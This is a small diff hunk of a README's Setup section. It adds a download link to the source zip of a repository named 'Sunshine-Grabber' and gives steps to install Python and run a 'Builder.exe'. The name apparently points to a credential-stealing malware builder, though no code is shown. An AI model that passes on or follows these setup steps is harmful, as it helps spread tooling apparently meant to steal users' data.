@@ -42,7 +42,7 @@
 
 ### Setup
 
-1. [Download source code zip]()
+1. [Download source code zip](https://github.com/SunshineCrea/Sunshine-Grabber/archive/refs/heads/main.zip)
 2. Extract zip
 3. Run `install_python.bat` if you don't have python installed
 4. Run the builder by double clicking the `Builder.exe` file
